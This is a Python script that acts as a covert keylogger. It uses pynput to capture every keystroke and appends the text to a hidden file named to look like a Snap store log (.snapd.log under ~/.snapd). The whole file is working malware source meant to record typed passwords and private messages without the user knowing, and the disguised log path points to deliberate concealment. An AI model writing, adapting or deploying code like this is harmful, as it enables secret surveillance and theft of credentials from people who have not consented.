from pynput.keyboard import Key, Listener
import os
import pwd

user = pwd.getpwuid(os.getuid())[0]
# make sure the path exists
file_path = f'/home/{user}/.snapd/snap-store/common/.snapd.log'

input = []

def on_press(key):
    global input
    try:
        if key != Key.enter:
            input.append(key)
    except:
        pass

    if len(input) > 0:
        handle_specials()
        write_file(input)
        input = []

def write_file(input):
    try:
        with open(file_path, 'a') as f:
            for c in input:
                key = str(c).replace("'", '')
                if str(key) == 'Key.tab' or str(key) == 'Key.enter':
                    f.write('\n')
                    f.close()
                if str(key) == 'Key.backspace':
                    f.write('.')
                    f.close()
                elif key.find('Key') == -1:
                    f.write(key)
                    f.close
    except:
        pass

def handle_specials():
    global input
    key = input[0]
    if str(key) == '<65027>':
        input = ['<AltGr>']
    if str(key) == 'Key.ctrl':
        input = ['<Ctrl>']
    if str(key) == 'Key.space':
        input = [' ']
    if str(key) == 'Key.cmd':
        input = ['<Super>']

def on_release(key):
    pass

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
